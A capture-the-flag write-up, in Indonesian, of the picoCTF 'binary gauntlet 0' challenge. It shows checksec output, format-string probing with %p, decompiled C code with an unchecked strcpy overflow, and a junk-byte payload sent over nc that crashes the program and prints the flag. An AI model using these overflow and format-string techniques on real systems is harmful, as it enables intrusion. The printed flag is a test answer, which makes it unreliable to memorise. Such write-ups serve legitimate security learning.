# binary gauntlet 0 

## summary
chall ini memiliki kerentanan buffer overflow dan akan melakukan print flag jika terjadi crash pada programnya.

## vulnerable
- buffer overflow
- format string
- tanpa proteksi apapun

## analysis
fastcheck melihat metadata dan proteksi program
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-0)
└> pwn checksec gauntlet
[*] '/home/rotalactf/reno/pwn/picoctf/binary-gauntlet-0/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-0)
└> file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=67ab552eab733f8ee5f57f2e6dadcad251b6fd63, for GNU/Linux 3.2.0, not stripped
```
terlihat seperti binary yang sangat rentan. aku lanjutkan dengan menjalankan program.

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-0)
└> ./gauntlet
helo
helo

┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-0)
└> ./gauntlet
%p
0xa70
ok
┌[rotalactf]-[LAPTOP-6QMID52F]-(binary-gauntlet-0)
└> ./gauntlet
%p%p%p
0x257025700xfbad22880xa702570
heeeeeeeeeeeeeelllllllllllllllloooooooooooooooooooo
```
program ini tidak melakukan apapun selain meminta input dan mencetaknya lagi. karena input ku di cetak lagi aku curiga akan adanya kerentanan format string. jadi aku coba input
`%p`. ternyata benar, ada kerentanan format string pada input pertama.

karena tidak banyak info yang bisa aku dapatkan dari sini , aku coba decompile program nya dengan ghidra

fungsi yang aku temukan adalah :
- main()
- sigsegv_handler()

**main()**
```C

undefined8 main(void)

{
  char local_88 [108];
  __gid_t local_1c;
  FILE *local_18;
  char *local_10;
  
  local_10 = malloc(1000);
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag,64,local_18);
  signal(11,sigsegv_handler);
  local_1c = getegid();
  setresgid(local_1c,local_1c,local_1c);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_88,local_10);
  return 0;
}
```

aku menyadari bahwa program ini memiliki kerentanan buffer overflow karena ia melakukan string copy (strcpy) dari `local_10` yang berukuran `999 byte` ke `local_88` yang hanya berukuran
`108 byte`.

selain itu flag ternyata juga sudah dibuka saat program dijalankan.

sigsegv_handler()
```C
void sigsegv_handler(void)

{
  fprintf(stderr,"%s\n",flag);
  fflush(stderr);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

```

ternyata fungsi ini melakukan print flag. fungsi sigsegv adalah fungsi yang akan di eksekusi jika program mengalami crash. aku bisa memanfaatkan kerentanan buffer overflow pada 
strcpy tadi untuk menimpa return address dengan byte sampah yang akan memicu program gagal kembali dan crash.


## exploit

```
└> python3 -c "print('a'*0x108)"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
└> nc -v chatelaine.cylabacademy.net 11008
Connection to chatelaine.cylabacademy.net (18.227.187.235) 11008 port [tcp/*] succeeded!
format string %p
format string 0x216e3881
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
262d422fc764460e144b9046a0719f8d
```

flag : **262d422fc764460e144b9046a0719f8d**
